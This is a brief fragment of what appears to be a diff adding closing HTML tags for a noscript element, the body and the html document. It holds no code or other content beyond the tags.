+  </noscript>
+</body>
+</html>
